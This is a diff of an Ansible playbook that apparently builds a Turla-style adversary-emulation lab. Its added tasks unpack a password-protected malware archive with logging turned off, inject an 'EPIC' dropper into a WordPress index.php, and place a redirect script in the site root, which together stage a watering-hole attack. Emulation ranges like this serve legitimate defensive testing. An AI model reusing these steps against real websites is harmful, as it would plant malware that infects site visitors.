@@ -57,11 +57,35 @@
   args:
     chdir: /opt/watering_hole/
 
-#- name: Move Redirect Java Script
-#  become: yes
-#  become_method: sudo
-#  ansible.builtin.copy:
-#    src: /opt/watering_hole/counter.js 
-#    dest: /srv/www/wordpress/counter.js 
-#    remote_src: yes
+- name: Copy Binaries to Modin 
+  become: yes
+  become_method: sudo
+  ansible.builtin.copy:
+    src: "files/turla/Resources/Binaries/binaries.zip"
+    dest: "/home/{{ ansible_ssh_user }}"
+    force: no
 
+- name: Unzip binaries in Modin
+  no_log: true
+  unarchive:
+    src: "/home/{{ ansible_ssh_user }}/binaries.zip"
+    dest: /home/{{ ansible_ssh_user }}/
+    remote_src: yes
+    extra_opts:
+      - "-P"
+      - "malware"
+
+- name: Put EPIC Dropper on WordPress 
+  become: yes
+  become_method: sudo
+  command: /usr/bin/python3 flash_prep.py /srv/www/wordpress/index.php /home/{{ ansible_ssh_user }}/epic/dropper.exe 
+  args:
+    chdir: /opt/watering_hole/
+
+- name: Move Redirect Java Script
+  become: yes
+  become_method: sudo
+  ansible.builtin.copy:
+    src: /opt/watering_hole/counter.js 
+    dest: /srv/www/wordpress/counter.js 
+    remote_src: yes
